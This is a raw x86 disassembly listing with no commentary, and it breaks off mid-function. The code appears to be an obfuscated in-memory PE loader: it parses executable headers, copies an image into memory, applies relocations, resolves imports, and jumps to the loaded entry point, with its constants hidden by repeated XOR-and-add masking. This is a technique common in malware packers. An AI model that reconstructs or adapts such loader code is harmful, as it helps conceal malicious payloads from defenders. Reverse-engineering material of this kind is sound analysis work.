  425631:	mov    edx,DWORD PTR [ebp-0x4]
  425634:	mov    eax,0x7e0da2f
  425639:	mov    DWORD PTR [edx],eax
  42563b:	mov    edx,DWORD PTR [ebp-0x8]
  42563e:	cmp    edx,eax
  425640:	jne    0x425646
  425642:	mov    BYTE PTR [ecx+0x7],0x58
  425646:	mov    eax,DWORD PTR [ebp+0x8]
  425649:	mov    BYTE PTR [ecx+0x1],0x1a
  42564d:	mov    BYTE PTR [eax+0x9],0x2f
  425651:	leave  
  425652:	ret    0x4
  425655:	push   ebp
  425656:	mov    ebp,esp
  425658:	push   ecx
  425659:	push   ecx
  42565a:	lea    eax,[ebp-0x8]
  42565d:	mov    DWORD PTR [ebp-0x4],eax
  425660:	push   esi
  425661:	mov    esi,DWORD PTR [ebp-0x4]
  425664:	mov    eax,0x7060e3e
  425669:	mov    DWORD PTR [esi],eax
  42566b:	mov    esi,DWORD PTR [ebp-0x8]
  42566e:	cmp    esi,eax
  425670:	pop    esi
  425671:	jne    0x42567d
  425673:	mov    BYTE PTR [edx+0x4],0x14
  425677:	mov    WORD PTR [ecx+0x3],0x141f
  42567d:	mov    BYTE PTR [edx],0x40
  425680:	leave  
  425681:	ret    
  425682:	push   ebp
  425683:	mov    ebp,esp
  425685:	push   ecx
  425686:	push   ecx
  425687:	lea    eax,[ebp-0x8]
  42568a:	mov    DWORD PTR [ebp-0x4],eax
  42568d:	mov    edx,DWORD PTR [ebp-0x4]
  425690:	mov    eax,0xf8870b3f
  425695:	mov    DWORD PTR [edx],eax
  425697:	mov    edx,DWORD PTR [ebp-0x8]
  42569a:	cmp    edx,eax
  42569c:	jne    0x4256a9
  42569e:	mov    eax,DWORD PTR [ebp+0x8]
  4256a1:	mov    BYTE PTR [ecx+0x8],0x10
  4256a5:	mov    BYTE PTR [eax+0x1],0x1a
  4256a9:	mov    BYTE PTR [ecx+0x5],0xc
  4256ad:	leave  
  4256ae:	ret    0x4
  4256b1:	push   esi
  4256b2:	mov    ecx,edi
  4256b4:	call   0x425682
  4256b9:	mov    edx,edi
  4256bb:	mov    ecx,esi
  4256bd:	mov    BYTE PTR [esi],0x20
  4256c0:	call   0x425655
  4256c5:	push   esi
  4256c6:	mov    ecx,edi
  4256c8:	mov    BYTE PTR [esi+0x5],0xc
  4256cc:	call   0x425626
  4256d1:	push   esi
  4256d2:	mov    BYTE PTR [esi+0x6],0x10
  4256d6:	call   0x4255f3
  4256db:	mov    BYTE PTR [esi+0x2],0x15
  4256df:	mov    edx,esi
  4256e1:	jmp    0x4255c3
  4256e6:	push   ebp
  4256e7:	mov    ebp,esp
  4256e9:	push   ecx
  4256ea:	mov    ecx,DWORD PTR [edx+0x194]
  4256f0:	push   esi
  4256f1:	mov    esi,DWORD PTR [ebp+0x8]
  4256f4:	mov    esi,DWORD PTR [esi]
  4256f6:	mov    DWORD PTR [ecx],esi
  4256f8:	mov    ecx,DWORD PTR [edx+0x194]
  4256fe:	mov    ecx,DWORD PTR [ecx]
  425700:	mov    esi,DWORD PTR [edx+0x190]
  425706:	mov    DWORD PTR [esi],ecx
  425708:	mov    eax,DWORD PTR [edx+0x194]
  42570e:	mov    ecx,DWORD PTR [eax]
  425710:	mov    ecx,DWORD PTR [ecx+0x3c]
  425713:	add    ecx,DWORD PTR [eax]
  425715:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  42571c:	mov    eax,DWORD PTR [ebp-0x4]
  42571f:	movzx  ecx,WORD PTR [ecx+0x16]
  425723:	xor    eax,0x75108af
  425728:	add    eax,0x3272f6
  42572d:	pop    esi
  42572e:	test   ecx,eax
  425730:	je     0x42573e
  425732:	mov    eax,DWORD PTR [edx+0x1c8]
  425738:	mov    DWORD PTR [eax],0xf89c85a4
  42573e:	leave  
  42573f:	ret    0x4
  425742:	push   ebp
  425743:	mov    ebp,esp
  425745:	sub    esp,0x70
  425748:	and    DWORD PTR [ebp-0x20],0x0
  42574c:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  425753:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  42575a:	mov    DWORD PTR [ebp-0x2c],0xf89c85a1
  425761:	mov    DWORD PTR [ebp-0x14],0xf89c85a3
  425768:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  42576f:	mov    eax,DWORD PTR [ebp+0x20]
  425772:	mov    eax,DWORD PTR [eax+0x194]
  425778:	mov    DWORD PTR [ebp-0xc],eax
  42577b:	mov    eax,DWORD PTR [ebp+0x20]
  42577e:	push   ebx
  42577f:	push   esi
  425780:	mov    esi,DWORD PTR [eax+0x190]
  425786:	mov    eax,DWORD PTR [ebp+0x20]
  425789:	mov    eax,DWORD PTR [eax+0x18c]
  42578f:	mov    DWORD PTR [ebp-0x8],eax
  425792:	mov    eax,DWORD PTR [eax]
  425794:	push   edi
  425795:	mov    DWORD PTR [ebp-0x4],esi
  425798:	test   eax,eax
  42579a:	jne    0x4257a7
  42579c:	push   DWORD PTR [ebp+0x1c]
  42579f:	mov    edx,DWORD PTR [ebp+0x20]
  4257a2:	call   0x4256e6
  4257a7:	mov    eax,DWORD PTR [esi]
  4257a9:	mov    ebx,DWORD PTR [esi]
  4257ab:	add    ebx,DWORD PTR [eax+0x3c]
  4257ae:	mov    eax,DWORD PTR [ebp+0xc]
  4257b1:	mov    ecx,DWORD PTR [ebp-0x8]
  4257b4:	mov    ecx,DWORD PTR [ecx]
  4257b6:	mov    esi,0x75108af
  4257bb:	xor    eax,esi
  4257bd:	mov    edi,0x3272f6
  4257c2:	add    eax,edi
  4257c4:	cmp    eax,ecx
  4257c6:	jne    0x4259fe
  4257cc:	mov    eax,DWORD PTR [ebp-0xc]
  4257cf:	mov    eax,DWORD PTR [eax]
  4257d1:	mov    DWORD PTR [ebp-0x10],eax
  4257d4:	mov    eax,DWORD PTR [ebx+0x50]
  4257d7:	mov    DWORD PTR [ebp-0x68],eax
  4257da:	mov    eax,DWORD PTR [ebp-0x18]
  4257dd:	xor    eax,esi
  4257df:	add    eax,edi
  4257e1:	mov    DWORD PTR [ebp-0x64],eax
  4257e4:	mov    eax,DWORD PTR [ebp-0x14]
  4257e7:	and    DWORD PTR [ebp-0x6c],0x0
  4257eb:	xor    eax,esi
  4257ed:	add    eax,edi
  4257ef:	mov    DWORD PTR [ebp-0x60],eax
  4257f2:	lea    eax,[ebp-0x70]
  4257f5:	push   eax
  4257f6:	mov    eax,DWORD PTR [ebp+0x8]
  4257f9:	xor    eax,esi
  4257fb:	add    eax,edi
  4257fd:	push   eax
  4257fe:	mov    eax,DWORD PTR [ebp+0x20]
  425801:	add    eax,0xaa
  425806:	push   eax
  425807:	mov    eax,DWORD PTR [ebp+0x20]
  42580a:	mov    eax,DWORD PTR [eax+0x198]
  425810:	mov    DWORD PTR [ebp-0x70],0x4
  425817:	push   DWORD PTR [eax]
  425819:	mov    eax,DWORD PTR [ebp+0x10]
  42581c:	call   eax
  42581e:	mov    ecx,DWORD PTR [ebp-0xc]
  425821:	mov    ecx,DWORD PTR [ecx]
  425823:	mov    edx,DWORD PTR [ebp-0x8]
  425826:	mov    DWORD PTR [ebp-0x6c],eax
  425829:	mov    DWORD PTR [ebp+0x1c],eax
  42582c:	mov    DWORD PTR [edx],ecx
  42582e:	mov    ecx,DWORD PTR [ebp-0x4]
  425831:	mov    DWORD PTR [ecx],eax
  425833:	mov    eax,DWORD PTR [ebx+0x50]
  425836:	mov    DWORD PTR [ebp-0x68],eax
  425839:	mov    eax,DWORD PTR [ebp-0x1c]
  42583c:	xor    eax,esi
  42583e:	add    eax,edi
  425840:	mov    DWORD PTR [ebp-0x64],eax
  425843:	lea    eax,[ebp-0x20]
  425846:	mov    DWORD PTR [ebp-0x60],eax
  425849:	lea    eax,[ebp-0x70]
  42584c:	push   eax
  42584d:	mov    eax,DWORD PTR [ebp+0x8]
  425850:	xor    eax,esi
  425852:	add    eax,edi
  425854:	push   eax
  425855:	mov    eax,DWORD PTR [ebp+0x20]
  425858:	add    eax,0xee
  42585d:	push   eax
  42585e:	mov    eax,DWORD PTR [ebp+0x20]
  425861:	mov    eax,DWORD PTR [eax+0x198]
  425867:	mov    DWORD PTR [ebp-0x70],0x4
  42586e:	push   DWORD PTR [eax]
  425870:	mov    eax,DWORD PTR [ebp+0x10]
  425873:	call   eax
  425875:	test   eax,eax
  425877:	je     0x42589c
  425879:	and    DWORD PTR [ebp+0xc],0x0
  42587d:	cmp    DWORD PTR [ebx+0x50],0x0
  425881:	jbe    0x42589c
  425883:	mov    eax,DWORD PTR [ebp+0x1c]
  425886:	mov    ecx,DWORD PTR [ebp-0x10]
  425889:	sub    ecx,eax
  42588b:	mov    dl,BYTE PTR [ecx+eax*1]
  42588e:	inc    DWORD PTR [ebp+0xc]
  425891:	mov    BYTE PTR [eax],dl
  425893:	mov    edx,DWORD PTR [ebp+0xc]
  425896:	inc    eax
  425897:	cmp    edx,DWORD PTR [ebx+0x50]
  42589a:	jb     0x42588b
  42589c:	mov    edx,DWORD PTR [ebp+0x1c]
  42589f:	mov    ecx,DWORD PTR [edx+0x3c]
  4258a2:	add    ecx,edx
  4258a4:	mov    eax,DWORD PTR [ecx+0xa0]
  4258aa:	mov    ebx,DWORD PTR [ecx+0x28]
  4258ad:	add    eax,edx
  4258af:	sub    edx,DWORD PTR [ebp-0x10]
  4258b2:	add    ebx,DWORD PTR [ebp+0x1c]
  4258b5:	mov    DWORD PTR [ebp+0xc],edx
  4258b8:	mov    DWORD PTR [ebp-0x2c],ecx
  4258bb:	mov    DWORD PTR [ebp-0x14],ebx
  4258be:	mov    DWORD PTR [ebp-0x8],0x0
  4258c5:	jmp    0x425941
  4258c7:	add    edx,0xfffffff8
  4258ca:	shr    edx,1
  4258cc:	mov    DWORD PTR [ebp-0x18],edx
  4258cf:	je     0x42592d
  4258d1:	lea    edx,[eax+0x8]
  4258d4:	mov    DWORD PTR [ebp-0x4],edx
  4258d7:	mov    edx,DWORD PTR [ebp-0x18]
  4258da:	mov    DWORD PTR [ebp-0x18],edx
  4258dd:	mov    edx,DWORD PTR [ebp-0x4]
  4258e0:	movzx  edx,WORD PTR [edx]
  4258e3:	mov    DWORD PTR [ebp-0x24],edx
  4258e6:	and    edx,0xfff
  4258ec:	mov    DWORD PTR [ebp-0x28],edx
  4258ef:	mov    edx,DWORD PTR [ebp-0x24]
  4258f2:	shr    edx,0xc
  4258f5:	add    edx,0xffcd8d0a
  4258fb:	xor    edx,esi
  4258fd:	cmp    edx,0xf89c85a2
  425903:	jne    0x425924
  425905:	mov    edx,DWORD PTR [ebp-0x28]
  425908:	add    edx,DWORD PTR [ebp+0x1c]
  42590b:	mov    ebx,DWORD PTR [eax]
  42590d:	cmp    DWORD PTR [ebx+edx*1],0x0
  425911:	je     0x425921
  425913:	mov    ecx,DWORD PTR [ebp+0xc]
  425916:	add    ecx,DWORD PTR [ebx+edx*1]
  425919:	mov    ebx,DWORD PTR [eax]
  42591b:	mov    DWORD PTR [edx+ebx*1],ecx
  42591e:	mov    ecx,DWORD PTR [ebp-0x2c]
  425921:	mov    ebx,DWORD PTR [ebp-0x14]
  425924:	add    DWORD PTR [ebp-0x4],0x2
  425928:	dec    DWORD PTR [ebp-0x18]
  42592b:	jne    0x4258dd
  42592d:	mov    edx,DWORD PTR [ebp-0xc]
  425930:	add    DWORD PTR [ebp-0x8],edx
  425933:	mov    edx,DWORD PTR [ebp-0x8]
  425936:	cmp    edx,DWORD PTR [ecx+0xa4]
  42593c:	jae    0x42594f
  42593e:	add    eax,DWORD PTR [ebp-0xc]
  425941:	mov    edx,DWORD PTR [eax+0x4]
  425944:	mov    DWORD PTR [ebp-0xc],edx
  425947:	test   edx,edx
  425949:	jne    0x4258c7
  42594f:	mov    eax,DWORD PTR [ebp-0x10]
  425952:	mov    DWORD PTR [ebp-0x6c],eax
  425955:	mov    DWORD PTR [ebp-0x70],0x4
  42595c:	mov    eax,DWORD PTR [ecx+0x50]
  42595f:	mov    DWORD PTR [ebp-0x68],eax
  425962:	mov    eax,DWORD PTR [ebp-0x1c]
  425965:	xor    eax,esi
  425967:	add    eax,edi
  425969:	mov    DWORD PTR [ebp-0x64],eax
  42596c:	lea    eax,[ebp-0x20]
  42596f:	mov    DWORD PTR [ebp-0x60],eax
  425972:	lea    eax,[ebp-0x70]
  425975:	push   eax
  425976:	mov    eax,DWORD PTR [ebp+0x8]
  425979:	xor    eax,esi
  42597b:	add    eax,edi
  42597d:	push   eax
  42597e:	mov    eax,DWORD PTR [ebp+0x20]
  425981:	add    eax,0xee
  425986:	push   eax
  425987:	mov    eax,DWORD PTR [ebp+0x20]
  42598a:	mov    eax,DWORD PTR [eax+0x198]
  425990:	push   DWORD PTR [eax]
  425992:	mov    eax,DWORD PTR [ebp+0x10]
  425995:	call   eax
  425997:	mov    eax,DWORD PTR [ebp+0x20]
  42599a:	mov    eax,DWORD PTR [eax+0x180]
  4259a0:	add    eax,DWORD PTR [ebp+0xc]
  4259a3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259a6:	push   DWORD PTR [ebp+0x18]
  4259a9:	mov    DWORD PTR [eax],ecx
  4259ab:	push   DWORD PTR [ebp+0x14]
  4259ae:	push   DWORD PTR [ebp+0x1c]
  4259b1:	call   ebx
  4259b3:	mov    ecx,DWORD PTR [ebp+0xc]
  4259b6:	add    ecx,DWORD PTR [ebp+0x20]
  4259b9:	lea    eax,[ebp+0x4]
  4259bc:	mov    DWORD PTR [ebp+0x20],ecx
  4259bf:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c2:	mov    ecx,DWORD PTR [ebp+0x20]
  4259c5:	mov    edx,DWORD PTR [ecx+0x190]
  4259cb:	mov    ecx,DWORD PTR [ebp+0x20]
  4259ce:	mov    ecx,DWORD PTR [ecx+0x18c]
  4259d4:	mov    esi,DWORD PTR [ecx]
  4259d6:	cmp    DWORD PTR [eax],esi
  4259d8:	jb     0x4259f9
  4259da:	mov    esi,DWORD PTR [edx]
  4259dc:	mov    edi,DWORD PTR [edx]
  4259de:	mov    esi,DWORD PTR [esi+0x3c]
  4259e1:	lea    esi,[edi+esi*1+0x50]
  4259e5:	mov    edi,DWORD PTR [ecx]
  4259e7:	add    edi,DWORD PTR [esi]
  4259e9:	cmp    DWORD PTR [eax],edi
  4259eb:	jae    0x4259f9
  4259ed:	mov    esi,DWORD PTR [ecx]
  4259ef:	mov    ecx,DWORD PTR [eax]
  4259f1:	mov    edx,DWORD PTR [edx]
  4259f3:	sub    ecx,esi
  4259f5:	add    edx,ecx
  4259f7:	mov    DWORD PTR [eax],edx
  4259f9:	mov    eax,DWORD PTR [ebp+0xc]
  4259fc:	jmp    0x425a00
  4259fe:	xor    eax,eax
  425a00:	pop    edi
  425a01:	pop    esi
  425a02:	pop    ebx
  425a03:	leave  
  425a04:	ret    0x1c
  425a07:	push   ebp
  425a08:	mov    ebp,esp
  425a0a:	sub    esp,0x1c
  425a0d:	push   esi
  425a0e:	mov    esi,eax
  425a10:	mov    eax,DWORD PTR [ecx+0x190]
  425a16:	cmp    DWORD PTR [eax],0x0
  425a19:	je     0x425b29
  425a1f:	test   edx,edx
  425a21:	je     0x425b29
  425a27:	test   esi,esi
  425a29:	je     0x425b29
  425a2f:	mov    eax,DWORD PTR [esi+0x88]
  425a35:	test   eax,eax
  425a37:	je     0x425b24
  425a3d:	cmp    DWORD PTR [esi+0x8c],0x10
  425a44:	je     0x425b24
  425a4a:	cmp    DWORD PTR [esi+0x34],edx
  425a4d:	je     0x425b24
  425a53:	mov    esi,DWORD PTR [ecx+0x18c]
  425a59:	and    DWORD PTR [ebp-0x10],0x0
  425a5d:	mov    ecx,edx
  425a5f:	sub    ecx,DWORD PTR [esi]
  425a61:	add    eax,edx
  425a63:	movzx  edx,WORD PTR [eax+0xc]
  425a67:	mov    DWORD PTR [ebp-0x1c],ecx
  425a6a:	movzx  ecx,WORD PTR [eax+0xe]
  425a6e:	add    ecx,edx
  425a70:	je     0x425b24
  425a76:	lea    ecx,[eax+0x14]
  425a79:	push   ebx
  425a7a:	mov    DWORD PTR [ebp-0x18],ecx
  425a7d:	mov    esi,0x7fffffff
  425a82:	push   edi
  425a83:	test   DWORD PTR [ecx],esi
  425a85:	je     0x425b06
  425a87:	mov    edx,DWORD PTR [ecx]
  425a89:	and    DWORD PTR [ebp-0xc],0x0
  425a8d:	and    edx,esi
  425a8f:	add    edx,eax
  425a91:	movzx  edi,WORD PTR [edx+0xe]
  425a95:	movzx  ebx,WORD PTR [edx+0xc]
  425a99:	add    edi,ebx
  425a9b:	je     0x425b06
  425a9d:	lea    ecx,[edx+0x14]
  425aa0:	mov    DWORD PTR [ebp-0x14],ecx
  425aa3:	test   DWORD PTR [ecx],esi
  425aa5:	je     0x425ae8
  425aa7:	mov    ecx,DWORD PTR [ecx]
  425aa9:	and    DWORD PTR [ebp-0x8],0x0
  425aad:	and    ecx,esi
  425aaf:	add    ecx,eax
  425ab1:	movzx  edi,WORD PTR [ecx+0xe]
  425ab5:	movzx  ebx,WORD PTR [ecx+0xc]
  425ab9:	add    edi,ebx
  425abb:	je     0x425ae8
  425abd:	lea    edi,[ecx+0x14]
  425ac0:	mov    DWORD PTR [ebp-0x4],edi
  425ac3:	mov    edi,DWORD PTR [ebp-0x4]
  425ac6:	mov    edi,DWORD PTR [edi]
  425ac8:	test   edi,edi
  425aca:	je     0x425ad2
  425acc:	mov    ebx,DWORD PTR [ebp-0x1c]
  425acf:	add    DWORD PTR [edi+eax*1],ebx
  425ad2:	movzx  edi,WORD PTR [ecx+0xe]
  425ad6:	movzx  ebx,WORD PTR [ecx+0xc]
  425ada:	inc    DWORD PTR [ebp-0x8]
  425add:	add    DWORD PTR [ebp-0x4],0x8
  425ae1:	add    edi,ebx
  425ae3:	cmp    DWORD PTR [ebp-0x8],edi
  425ae6:	jb     0x425ac3
  425ae8:	movzx  edi,WORD PTR [edx+0xe]
  425aec:	movzx  ebx,WORD PTR [edx+0xc]
  425af0:	mov    ecx,DWORD PTR [ebp-0x14]
  425af3:	inc    DWORD PTR [ebp-0xc]
  425af6:	add    ecx,0x8
  425af9:	add    edi,ebx
  425afb:	mov    DWORD PTR [ebp-0x14],ecx
  425afe:	cmp    DWORD PTR [ebp-0xc],edi
  425b01:	jb     0x425aa3
  425b03:	mov    ecx,DWORD PTR [ebp-0x18]
  425b06:	movzx  edx,WORD PTR [eax+0xe]
  425b0a:	movzx  edi,WORD PTR [eax+0xc]
  425b0e:	inc    DWORD PTR [ebp-0x10]
  425b11:	add    ecx,0x8
  425b14:	add    edx,edi
  425b16:	mov    DWORD PTR [ebp-0x18],ecx
  425b19:	cmp    DWORD PTR [ebp-0x10],edx
  425b1c:	jb     0x425a83
  425b22:	pop    edi
  425b23:	pop    ebx
  425b24:	xor    eax,eax
  425b26:	inc    eax
  425b27:	jmp    0x425b2b
  425b29:	xor    eax,eax
  425b2b:	pop    esi
  425b2c:	leave  
  425b2d:	ret    
  425b2e:	push   ebp
  425b2f:	mov    ebp,esp
  425b31:	mov    ecx,DWORD PTR [ecx+0x190]
  425b37:	mov    eax,DWORD PTR [ebp+0xc]
  425b3a:	sub    esp,0x10
  425b3d:	push   ebx
  425b3e:	xor    ebx,ebx
  425b40:	push   esi
  425b41:	push   edi
  425b42:	cmp    DWORD PTR [ecx],ebx
  425b44:	je     0x425bcc
  425b4a:	cmp    eax,ebx
  425b4c:	je     0x425bcc
  425b4e:	cmp    DWORD PTR [eax+0x78],ebx
  425b51:	jne    0x425b58
  425b53:	xor    eax,eax
  425b55:	inc    eax
  425b56:	jmp    0x425bce
  425b58:	mov    eax,DWORD PTR [eax+0x78]
  425b5b:	add    eax,DWORD PTR [ebp+0x8]
  425b5e:	mov    ecx,DWORD PTR [eax+0x1c]
  425b61:	mov    edx,DWORD PTR [eax+0x24]
  425b64:	mov    esi,DWORD PTR [eax+0x14]
  425b67:	mov    edi,DWORD PTR [eax+0x18]
  425b6a:	add    ecx,DWORD PTR [ebp+0x8]
  425b6d:	add    edx,DWORD PTR [ebp+0x8]
  425b70:	mov    DWORD PTR [ebp-0x4],esi
  425b73:	cmp    esi,edi
  425b75:	ja     0x425b7a
  425b77:	mov    DWORD PTR [ebp-0x4],edi
  425b7a:	mov    DWORD PTR [ebp-0x8],ebx
  425b7d:	cmp    DWORD PTR [ebp-0x4],ebx
  425b80:	jbe    0x425b53
  425b82:	cmp    ebx,DWORD PTR [eax+0x14]
  425b85:	jae    0x425b8d
  425b87:	movzx  esi,WORD PTR [edx+ebx*2]
  425b8b:	jmp    0x425b8f
  425b8d:	mov    esi,ebx
  425b8f:	lea    esi,[ecx+esi*4]
  425b92:	mov    edi,DWORD PTR [esi]
  425b94:	test   edi,edi
  425b96:	je     0x425bc1
  425b98:	add    edi,DWORD PTR [ebp+0x8]
  425b9b:	mov    DWORD PTR [ebp-0x10],edi
  425b9e:	cmp    edi,eax
  425ba0:	jbe    0x425bb2
  425ba2:	mov    ebx,DWORD PTR [ebp+0xc]
  425ba5:	mov    ebx,DWORD PTR [ebx+0x7c]
  425ba8:	add    ebx,eax
  425baa:	cmp    edi,ebx
  425bac:	jae    0x425bb2
  425bae:	mov    esi,DWORD PTR [esi]
  425bb0:	jmp    0x425bba
  425bb2:	sub    edi,DWORD PTR [ebp+0x8]
  425bb5:	mov    DWORD PTR [esi],edi
  425bb7:	mov    esi,DWORD PTR [ebp-0x10]
  425bba:	test   esi,esi
  425bbc:	je     0x425bcc
  425bbe:	mov    ebx,DWORD PTR [ebp-0x8]
  425bc1:	inc    ebx
  425bc2:	mov    DWORD PTR [ebp-0x8],ebx
  425bc5:	cmp    ebx,DWORD PTR [ebp-0x4]
  425bc8:	jb     0x425b82
  425bca:	jmp    0x425b53
  425bcc:	xor    eax,eax
  425bce:	pop    edi
  425bcf:	pop    esi
  425bd0:	pop    ebx
  425bd1:	leave  
  425bd2:	ret    0x8
  425bd5:	push   ebp
  425bd6:	mov    ebp,esp
  425bd8:	sub    esp,0x2c
  425bdb:	mov    edx,0xf89c85a5
  425be0:	mov    DWORD PTR [ebp-0x4],edx
  425be3:	mov    DWORD PTR [ebp-0x8],0xf89c85a4
  425bea:	mov    eax,DWORD PTR [ebp-0x4]
  425bed:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf0:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf3:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf6:	mov    ecx,DWORD PTR [ebp-0x4]
  425bf9:	mov    ecx,DWORD PTR [ebp-0x4]
  425bfc:	push   ebx
  425bfd:	mov    ebx,DWORD PTR [ebp+0x10]
  425c00:	push   esi
  425c01:	mov    esi,0x75108af
  425c06:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  425c0d:	mov    ecx,DWORD PTR [ebp-0x4]
  425c10:	mov    ebx,DWORD PTR [ebx+0x190]
  425c16:	push   edi
  425c17:	mov    edi,0x3272f6
  425c1c:	xor    ecx,esi
  425c1e:	xor    eax,esi
  425c20:	add    eax,edi
  425c22:	add    ecx,edi
  425c24:	mov    DWORD PTR [ebp-0x18],eax
  425c27:	cmp    ecx,DWORD PTR [ebx]
  425c29:	je     0x425eaa
  425c2f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c32:	mov    ecx,DWORD PTR [ebp+0xc]
  425c35:	xor    ebx,esi
  425c37:	add    ebx,edi
  425c39:	cmp    ebx,ecx
  425c3b:	je     0x425eaa
  425c41:	mov    ebx,DWORD PTR [ebp-0x4]
  425c44:	mov    ecx,DWORD PTR [ecx+0x80]
  425c4a:	xor    ebx,esi
  425c4c:	add    ebx,edi
  425c4e:	cmp    ecx,ebx
  425c50:	je     0x425ea5
  425c56:	add    ecx,DWORD PTR [ebp+0x8]
  425c59:	mov    DWORD PTR [ebp-0x2c],ecx
  425c5c:	mov    ebx,edx
  425c5e:	xor    ebx,esi
  425c60:	add    ebx,edi
  425c62:	mov    DWORD PTR [ebp-0x10],ebx
  425c65:	mov    ebx,DWORD PTR [ebp-0x10]
  425c68:	cmp    ebx,edx
  425c6a:	je     0x425c7e
  425c6c:	mov    edx,DWORD PTR [ebp-0x10]
  425c6f:	mov    ebx,DWORD PTR [ebp-0x4]
  425c72:	imul   edx,edx,0x14
  425c75:	xor    ebx,esi
  425c77:	add    ebx,edi
  425c79:	cmp    DWORD PTR [edx+ecx*1],ebx
  425c7c:	jne    0x425c95
  425c7e:	mov    edx,DWORD PTR [ebp-0x10]
  425c81:	mov    ebx,DWORD PTR [ebp-0x4]
  425c84:	imul   edx,edx,0x14
  425c87:	xor    ebx,esi
  425c89:	add    ebx,edi
  425c8b:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  425c8f:	je     0x425e97
  425c95:	mov    eax,DWORD PTR [ebp-0x4]
  425c98:	mov    ebx,DWORD PTR [ebp-0x4]
  425c9b:	mov    eax,DWORD PTR [ebp-0x10]
  425c9e:	imul   eax,eax,0x14
  425ca1:	add    eax,ecx
  425ca3:	mov    ecx,DWORD PTR [eax+0x10]
  425ca6:	add    ecx,DWORD PTR [ebp+0x8]
  425ca9:	xor    ebx,esi
  425cab:	mov    DWORD PTR [ebp-0x1c],ecx
  425cae:	mov    ecx,DWORD PTR [ebp-0x4]
  425cb1:	mov    edx,DWORD PTR [ebp-0x4]
  425cb4:	xor    ecx,esi
  425cb6:	add    ecx,edi
  425cb8:	xor    edx,esi
  425cba:	mov    DWORD PTR [ebp-0x24],ecx
  425cbd:	mov    ecx,DWORD PTR [eax]
  425cbf:	add    edx,edi
  425cc1:	add    ebx,edi
  425cc3:	cmp    ecx,edx
  425cc5:	je     0x425ccd
  425cc7:	add    ecx,DWORD PTR [ebp+0x8]
  425cca:	mov    DWORD PTR [ebp-0x24],ecx
  425ccd:	mov    ecx,DWORD PTR [ebp-0x4]
  425cd0:	xor    ecx,esi
  425cd2:	add    ecx,DWORD PTR [eax+0xc]
  425cd5:	mov    eax,DWORD PTR [ebp+0x8]
  425cd8:	lea    eax,[ecx+eax*1+0x3272f6]
  425cdf:	mov    DWORD PTR [ebp+0xc],eax
  425ce2:	mov    DWORD PTR [ebp-0x28],0xf89c85a0
  425ce9:	mov    eax,DWORD PTR [ebp+0x10]
  425cec:	push   DWORD PTR [ebp+0xc]
  425cef:	mov    eax,DWORD PTR [eax+0x1e0]
  425cf5:	call   DWORD PTR [eax]
  425cf7:	mov    ecx,DWORD PTR [ebp-0x4]
  425cfa:	xor    ecx,esi
  425cfc:	add    ecx,edi
  425cfe:	mov    DWORD PTR [ebp-0xc],eax
  425d01:	cmp    ecx,eax
  425d03:	jne    0x425d17
  425d05:	mov    eax,DWORD PTR [ebp+0x10]
  425d08:	push   DWORD PTR [ebp+0xc]
  425d0b:	mov    eax,DWORD PTR [eax+0x1e0]
  425d11:	call   DWORD PTR [eax+0xc]
  425d14:	mov    DWORD PTR [ebp-0xc],eax
  425d17:	mov    DWORD PTR [ebp-0x20],0x7f661b2c
  425d1e:	mov    DWORD PTR [ebp-0x20],0xf89c985c
  425d25:	mov    eax,DWORD PTR [ebp-0x4]
  425d28:	xor    eax,esi
  425d2a:	add    eax,edi
  425d2c:	cmp    eax,DWORD PTR [ebp-0xc]
  425d2f:	jne    0x425d54
  425d31:	mov    eax,DWORD PTR [ebp-0x8]
  425d34:	mov    ecx,DWORD PTR [ebp-0x20]
  425d37:	xor    eax,esi
  425d39:	xor    ecx,esi
  425d3b:	lea    ebx,[ebx+eax*1+0x3272f6]
  425d42:	mov    eax,DWORD PTR [ebp+0x10]
  425d45:	mov    eax,DWORD PTR [eax+0x1e0]
  425d4b:	add    ecx,edi
  425d4d:	imul   ecx,ebx
  425d50:	push   ecx
  425d51:	call   DWORD PTR [eax+0x24]
  425d54:	mov    eax,DWORD PTR [ebp-0x4]
  425d57:	xor    eax,esi
  425d59:	add    eax,edi
  425d5b:	cmp    eax,DWORD PTR [ebp-0xc]
  425d5e:	jne    0x425d6f
  425d60:	mov    eax,DWORD PTR [ebp-0x28]
  425d63:	xor    eax,esi
  425d65:	add    eax,edi
  425d67:	cmp    ebx,eax
  425d69:	jbe    0x425ce9
  425d6f:	mov    eax,DWORD PTR [ebp-0x4]
  425d72:	xor    eax,esi
  425d74:	add    eax,edi
  425d76:	cmp    eax,DWORD PTR [ebp-0xc]
  425d79:	jne    0x425d92
  425d7b:	mov    eax,DWORD PTR [ebp-0x8]
  425d7e:	mov    ecx,DWORD PTR [ebp-0x18]
  425d81:	xor    eax,esi
  425d83:	lea    eax,[ecx+eax*1+0x3272f6]
  425d8a:	mov    DWORD PTR [ebp-0x18],eax
  425d8d:	jmp    0x425e81
  425d92:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  425d99:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  425da0:	mov    ebx,DWORD PTR [ebp-0x4]
  425da3:	xor    ebx,esi
  425da5:	add    ebx,edi
  425da7:	jmp    0x425e6e
  425dac:	mov    eax,DWORD PTR [ebp-0x4]
  425daf:	xor    eax,esi
  425db1:	add    eax,edi
  425db3:	mov    DWORD PTR [ebp-0x14],eax
  425db6:	mov    eax,DWORD PTR [ebp-0x4]
  425db9:	xor    eax,esi
  425dbb:	add    eax,edi
  425dbd:	mov    DWORD PTR [ebp+0xc],eax
  425dc0:	mov    ecx,DWORD PTR [ebp-0x4]
  425dc3:	mov    eax,DWORD PTR [ebp-0x24]
  425dc6:	xor    ecx,esi
  425dc8:	add    ecx,edi
  425dca:	cmp    ecx,eax
  425dcc:	je     0x425dd4
  425dce:	mov    eax,DWORD PTR [eax+ebx*4]
  425dd1:	mov    DWORD PTR [ebp-0x14],eax
  425dd4:	mov    eax,DWORD PTR [ebp-0x1c]
  425dd7:	mov    eax,DWORD PTR [eax+ebx*4]
